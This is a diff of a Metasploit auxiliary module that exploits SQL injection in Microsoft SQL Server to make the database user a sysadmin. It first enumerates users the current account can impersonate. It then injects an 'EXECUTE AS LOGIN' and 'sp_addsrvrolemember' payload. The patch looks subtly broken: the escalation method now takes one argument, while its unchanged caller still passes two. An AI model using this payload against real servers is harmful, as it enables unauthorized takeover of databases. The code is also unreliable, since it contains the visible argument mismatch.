@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
@@ -28,60 +26,60 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # Get the database user name
-    print_status("#{peer} - Grabbing the database user name...")
+    print_status("Grabbing the database user name...")
     db_user = get_username
     if db_user.nil?
-      print_error("#{peer} - Unable to grab user name...")
+      print_error("Unable to grab user name...")
       return
     else
-      print_good("#{peer} - Database user: #{db_user}")
+      print_good("Database user: #{db_user}")
     end
 
     # Grab sysadmin status
-    print_status("#{peer} - Checking if #{db_user} is already a sysadmin...")
+    print_status("Checking if #{db_user} is already a sysadmin...")
     admin_status = check_sysadmin
 
     if admin_status.nil?
-      print_error("#{peer} - Couldn't retrieve user status, aborting...")
+      print_error("Couldn't retrieve user status, aborting...")
       return
     elsif admin_status == '1'
-      print_error("#{peer} - #{db_user} is already a sysadmin, no escalation needed.")
+      print_error("#{db_user} is already a sysadmin, no escalation needed.")
       return
     else
-      print_status("#{peer} - #{db_user} is NOT a sysadmin, let's try to escalate privileges.")
+      print_status("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
     end
 
     # Get list of users that can be impersonated
-    print_status("#{peer} - Enumerating a list of users that can be impersonated...")
+    print_status("Enumerating a list of users that can be impersonated...")
     imp_user_list = check_imp_users
     if imp_user_list.nil? || imp_user_list.empty?
-      print_error("#{peer} - Sorry, the current user doesnt have permissions to impersonate anyone.")
+      print_error("Sorry, the current user doesnt have permissions to impersonate anyone.")
       return
     else
       # Display list of users that can be impersonated
-      print_good("#{peer} - #{imp_user_list.length} users can be impersonated:")
+      print_good("#{imp_user_list.length} users can be impersonated:")
       imp_user_list.each do |dbuser|
-        print_status("#{peer} -   #{dbuser}")
+        print_status("  #{dbuser}")
       end
     end
 
     # Check if any of the users that can be impersonated are sysadmins
-    print_status("#{peer} - Checking if any of them are sysadmins...")
+    print_status("Checking if any of them are sysadmins...")
     imp_user_sysadmin = check_imp_sysadmin(imp_user_list)
     if imp_user_sysadmin.nil?
-      print_error("#{peer} - Sorry, none of the users that can be impersonated are sysadmins.")
+      print_error("Sorry, none of the users that can be impersonated are sysadmins.")
       return
     end
 
     # Attempt to escalate to sysadmin
-    print_status("#{peer} - Attempting to impersonate #{imp_user_sysadmin}...")
+    print_status("Attempting to impersonate #{imp_user_sysadmin}...")
     escalate_privs(imp_user_sysadmin,db_user)
 
     admin_status = check_sysadmin
     if admin_status && admin_status == '1'
-      print_good("#{peer} - Success! #{db_user} is now a sysadmin!")
+      print_good("Success! #{db_user} is now a sysadmin!")
     else
-      print_error("#{peer} - Fail buckets, something went wrong.")
+      print_error("Fail buckets, something went wrong.")
     end
   end
 
@@ -179,10 +177,10 @@ class Metasploit3 < Msf::Auxiliary
 
       # check if user is a sysadmin
       if parsed_result && parsed_result[0] == '1'
-        print_good("#{peer} -   #{imp_user} is a sysadmin!")
+        print_good("  #{imp_user} is a sysadmin!")
         return imp_user
       else
-        print_status("#{peer} -   #{imp_user} is NOT a sysadmin")
+        print_status("  #{imp_user} is NOT a sysadmin")
       end
     end
 
@@ -190,10 +188,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(imp_user,db_user)
+  def escalate_privs(db_user)
 
     # Setup Query - Impersonate the first sysadmin user on the list
-    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember 'MyUser1','sysadmin';Revert;--"
+    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--"
 
     # Execute Query
     mssql_query(evil_sql)
